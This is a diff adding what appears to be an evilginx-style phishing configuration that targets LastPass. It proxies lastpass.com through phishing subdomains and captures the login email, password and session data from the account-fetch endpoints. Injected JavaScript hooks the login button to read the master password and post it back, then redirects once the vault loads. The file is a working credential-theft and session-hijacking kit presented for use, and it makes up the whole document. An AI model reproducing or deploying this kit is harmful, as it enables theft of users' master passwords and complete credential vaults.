@@ -1,0 +1,107 @@
+name: 'lastpass'
+author: '@__pberba__'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'lastpass.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'lastpass.com'}
+  - {phish_sub: 'lp-cdn', orig_sub: 'lp-cdn', domain: 'lastpass.com'}
+
+
+sub_filters: []
+  # - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'lastpass.com'
+    keys: [
+      '/getaccts.php', 
+      '/iterations.php'
+    ]
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'lastpass.com'
+  path: '/?ac=1&lpnorefresh=1'
+
+js_inject:
+  - trigger_domains: ["lastpass.com"]
+    trigger_paths: ["/"]
+    trigger_params: []
+    script: |
+      var loc = window.location;
+      var is_login = (loc.pathname == '/') && (loc.search.indexOf('ac=1') != -1)
+
+      function grab_password() {
+        // grab the password (which should not be empty)
+        var passwords = document.getElementsByName("password");
+        var password = null;
+        for (var i = 0; i < passwords.length; i++) {
+          password = password || passwords[i].value;
+        }
+        return password;
+      }
+
+      login_onclick = function() {
+        // grab and send to server
+        var password = grab_password();
+        $.post("/login.php", {
+          '_password': password,
+          '__ex_ignore__': ''
+        }, function(data, status) {});
+      }
+
+      if ((typeof _startLogin === 'undefined') && (typeof startLogin !== 'undefined')) {
+        _startLogin = startLogin;
+        startLogin = function() {
+          login_onclick();
+          _startLogin();
+        }
+        console.log("Injecting login code...")
+      }
+
+      if ((typeof _postacctsload === 'undefined') && (typeof postacctsload !== 'undefined')) {
+        _postacctsload = postacctsload;
+        postacctsload = function() {
+          // Redirect once credentials are loaded
+          // We assume by this point we have all that we need
+          window.location.href = "{{REDIRECT_URL}}";
+          _postacctsload();
+        }
+        console.log("Injecting post accounts code...")
+      }
+      
+      find_login_button = function() {
+        var buttons = document.getElementsByTagName('button');
+        for (var i = 0; i < buttons.length; i++) {
+          var button = buttons[i];
+          if(button.innerText == 'LOG IN') 
+            return button
+        }
+      }
+
+      find_and_inject_login_button = function() {
+        // Look for a trigger when to try to grab the password
+        // If this changes maybe whenever ENTER is pressed ?
+        var login_button = find_login_button();
+        if(login_button){
+          console.log('Injected login onclick ...')
+          login_button.onclick = login_onclick;
+        } else {
+          setTimeout(find_and_inject_login_button, 100)
+        }
+      }
+
+      if (is_login) {
+        setTimeout(find_and_inject_login_button, 100);
+      }
+
+
+
